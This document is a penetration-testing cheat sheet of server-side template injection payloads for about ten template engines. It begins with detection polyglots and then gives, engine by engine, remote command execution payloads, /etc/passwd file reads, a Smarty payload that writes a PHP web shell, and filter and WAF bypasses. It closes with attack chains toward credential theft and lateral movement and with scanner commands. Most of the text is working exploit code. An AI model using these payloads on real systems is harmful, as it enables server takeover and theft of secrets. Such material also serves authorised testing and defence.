# SSTI Engine-Specific Payloads

Per-engine detection, exploitation, and bypass for Server-Side Template Injection.

## Detection Polyglots

```
${{<%[%'"}}%\
{{7*7}}          → 49 = server-side eval
{{7*'7'}}        → 7777777 = Jinja2/Twig
${7*7}           → 49 = Freemarker/Velocity/Mako
@(1+2)           → 3 = Razor (.NET)
<%= 7*7 %>       → 49 = ERB (Ruby) / EJS (Node)
```

## Engine Identification

| Payload | Engine if evaluated |
|---------|---------------------|
| `{{7*7}}` = 49 | Jinja2, Twig, Nunjucks, Handlebars |
| `{{7*'7'}}` = 7777777 | Jinja2 |
| `{{7*'7'}}` = 49 | Twig |
| `${7*7}` = 49 | Freemarker, Velocity, Mako |
| `@(1+2)` = 3 | Razor (.NET) |
| `#{7*7}` = 49 | Pebble, Thymeleaf |
| `{$smarty.version}` | Smarty (PHP) |
| `{{config}}` dumps config | Jinja2/Flask |

---

## Jinja2 (Python / Flask)

### Info Disclosure
```
{{config}}
{{self}}
{{settings.SECRET_KEY}}
{{request.environ}}
```

### RCE Payloads
```python
# Via __globals__
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}

# Via request object
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}

# Via config
{{ config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("ls").read() }}

# Via subclasses (find subprocess.Popen index)
{{ ''.__class__.__mro__[1].__subclasses__()[XXX]('id',shell=True,stdout=-1).communicate()[0] }}

# Via warning class search
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("id").read()}}{%endif%}{% endfor %}
```

### File Read
```python
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}
```

---

## Freemarker (Java)

```java
# RCE
<#assign cmd="freemarker.template.utility.Execute"?new()>${cmd("id")}
${"freemarker.template.utility.Execute"?new()("id")}

# Info
${class.getResource("").getPath()}
```

---

## Velocity (Java)

```java
#set($str=$class.inspect("java.lang.String").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())#foreach($i in [1..99])$str.valueOf($chr.toChars($out.read()))#end
```

---

## Twig (PHP)

```php
{{7*7}}
{{dump(app)}}
{{'/etc/passwd'|file_excerpt(1,30)}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

---

## Smarty (PHP)

```php
{$smarty.version}
{php}echo `id`;{/php}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
```

---

## Thymeleaf (Java/Spring)

```java
${T(java.lang.Runtime).getRuntime().exec('id')}
```

---

## Mako (Python)

```python
${self.module.os.popen('id').read()}
```

---

## Ruby (ERB)

```ruby
<%= system("whoami") %>
<%= File.open('/etc/passwd').read %>
<%= Dir.entries('/') %>
```

---

## Node.js (EJS/Pug/Nunjucks/Handlebars)

```javascript
# Generic prototype traversal
{{this.constructor.constructor('return process.mainModule.require("child_process").execSync("id")')()}}

# EJS
<%=(global.constructor.constructor('return process.mainModule.require("child_process").execSync("id").toString()')())%>
```

---

## .NET (Razor)

```csharp
@(1+2)
@System.Diagnostics.Process.Start("cmd.exe","/c whoami");
```

---

## Bypass Techniques

### Character Blacklist (Jinja2)

```python
# Replace dots with brackets + hex
{{ request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('id')['read']() }}

# Use attr() filter
{{ request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f') }}

# Pass via URL params
?c=__class__  →  {{ request|attr(request.args.c) }}
```

### Keyword Filtering

```python
# Concat to bypass 'os' filter
'o'+'s'

# Use context variables
{{ self._TemplateReference__context.cycler.__init__.__globals__.os }}
```

### String-less (WAF bypass)

```python
# Build from class hierarchy without quotes
{{ (().__class__.__base__.__subclasses__()[104].__init__.__globals__).os.popen('id').read() }}
```

---

## Chaining Opportunities

- SSTI → RCE (primary goal)
- SSTI → File read → credentials → lateral movement
- SSTI → SSRF via URL-fetch filters → cloud metadata
- SSTI → Env dump → API keys → cloud access
- SSTI → Internal network pivot

---

## Tools

- **SSTImap**: `python3 sstimap.py -u "https://target.com/?name=test" -s`
- **tplmap**: `python tplmap.py -u 'http://target.com/page?name=John*'`
- **TInjA**: `tinja url -u "http://target.com/?name=test"`
- **nuclei**: `nuclei -t ssti-* -u https://target.com`
